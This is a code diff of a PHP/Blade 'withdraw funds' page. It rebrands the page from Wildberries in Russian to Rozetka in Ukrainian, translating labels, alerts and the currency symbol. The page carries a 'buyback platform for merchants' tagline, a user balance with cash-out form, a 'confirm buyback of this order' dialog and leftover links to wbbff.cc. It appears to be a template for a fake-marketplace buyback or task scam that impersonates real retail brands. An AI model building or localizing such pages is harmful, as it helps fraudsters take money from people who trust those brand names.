@@ -11,11 +11,11 @@
 	</style>
 	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0">
-	<title>Вывод средств - Wildberries</title>
-	<meta name="keywords" content="Платформа обратного выкупа для российских торговцев">
-	<meta name="description" content="Коллекции женской, мужской и детской одежды, обуви, а также товары для дома и спорта. Информация о доставке и оплате. Таблицы размеров, советы по уходу за вещами.">
+	<title>Виведення коштів - Rozetka</title>
+	<meta name="keywords" content="Платформа зворотного викупу для українських торговців">
+	<meta name="description" content="Колекції жіночого, чоловічого та дитячого одягу, взуття, а також товари для дому та спорту. Інформація про доставку та оплату. Таблиці розмірів, поради по догляду за речами.">
 	<meta name="format-detection" content="telephone=no">
-	<link rel="shortcut icon" type="image/ico" href="https://wbbff.cc/favicon.ico">
+	<link rel="shortcut icon" type="image/ico" href="<?php echo asset("assets/favicon.ico") ?>">
 	<link type="text/css" rel="stylesheet" href="<?php echo asset("assets/style.css") ?>">
 	<script type="text/javascript" src="<?php echo asset("assets/jquery.js") ?>"></script>
 	<script type="text/javascript" src="<?php echo asset("assets/global.js") ?>"></script>
@@ -26,15 +26,15 @@
 <body>
 	<div class="pagetop">
 		<div class="fh"><a href="javascript:history.back(-1)"></a></div>
-		<div>Вывод средств</div>
+		<div>Виведення коштів</div>
 
 		<!-- 
 <div class="top_menu" id="top_menu">
 	<ul>
-	<li><a href="<?php echo route("index") ?>"><i class="top_tb1"></i><span>Главная</span></a></li>
+	<li><a href="<?php echo route("index") ?>"><i class="top_tb1"></i><span>Головна</span></a></li>
 	<li><a href="https://wbbff.cc/index.php/category/list"><i class="top_tb2"></i><span>Каталог</span></a></li>
-	<li><a href="<?php echo route("cart") ?>"><i class="top_tb3"></i><span>Корзина</span></a></li>
-	<li><a href="<?php echo route("profile") ?>"><i class="top_tb4"></i><span>Профиль</span></a></li>
+	<li><a href="<?php echo route("cart") ?>"><i class="top_tb3"></i><span>Кошик</span></a></li>
+	<li><a href="<?php echo route("profile") ?>"><i class="top_tb4"></i><span>Профіль</span></a></li>
 	</ul>
 	<div class="clear"></div>
 </div> -->
@@ -57,7 +57,7 @@
 					<tr>
 						<td style="text-align:right;" width="150">баланс：</td>
 						<td style="text-align:left;">
-							<span class="corg">{{ Auth::user()->balance }} ₾.</span>
+							<span class="corg">{{ Auth::user()->balance }} ₴.</span>
 						</td>
 					</tr>
 					<tr>
@@ -74,9 +74,9 @@
 						</td>
 					</tr>
 					<tr>
-						<td style="text-align:right;">сумма вывода：</td>
+						<td style="text-align:right;">сума виведення：</td>
 						<td style="text-align:left;">
-							<input type="text" name="cashout_money" value="0.0" class="inputall input100" autocomplete="off"> ₾
+							<input type="text" name="cashout_money" value="0.0" class="inputall input100" autocomplete="off"> ₴
 							<span id="cashout_money_show" class="mal10"></span>
 						</td>
 					</tr>
@@ -94,7 +94,7 @@
 
 				<input type="hidden" name="pe_token" value="75236c7c5fdf7ebfe3441c02863d0cb8">
 				<input type="hidden" name="pesubmit">
-				<input type="button" value="снятие" class="tjbtn">
+				<input type="button" value="зняття" class="tjbtn">
 
 
 			</div>
@@ -114,7 +114,7 @@
 	<script type="text/javascript">
 		$(function() {
 			if (1 == 0) {
-				pe_alert("Пожалуйста, сначала добавьте платежный аккаунт", function() {
+				pe_alert("Будь ласка, спочатку додайте платіжний рахунок", function() {
 					pe_open('user.php?mod=userbank&act=add&fromto=https%3A%2F%2Fwbbff.cc%2Fuser.php%3Fmod%3Dcashout%26act%3Dadd');
 				});
 			}
@@ -126,7 +126,7 @@
 			$(":button").click(function() {
 				var cashout_money = pe_num($(":input[name='cashout_money']").val(), 'float', 1);
 				if (cashout_money <= 0) {
-					app_tip("Введите сумма вывода", 'error');
+					app_tip("Введіть суму виведення", 'error');
 					return false;
 				}
 				app_submit("{{ route('cashouts.store') }}", function(json) {
@@ -146,7 +146,7 @@
 	<script type="text/javascript" src="<?php echo asset("assets/layer.js") ?>"></script>
 	<script type="text/javascript" src="<?php echo asset("assets/app.js") ?>"></script>
 	<script type="text/javascript">
-		//顶部菜单点击
+		//верхнє меню клік
 		function top_menu() {
 			if ($("#top_menu").is(":hidden")) {
 				$("#top_menu").show();
@@ -162,8 +162,8 @@
 	<script>
 		function confirm_huigou(order_id) {
 			layer.open({
-				content: "Определить выкуп этого Заказ？",
-				btn: ["OK", "Отмена"],
+				content: "Визначити викуп цього Замовлення？",
+				btn: ["OK", "Скасувати"],
 				shadeClose: false,
 				yes: function() {
 
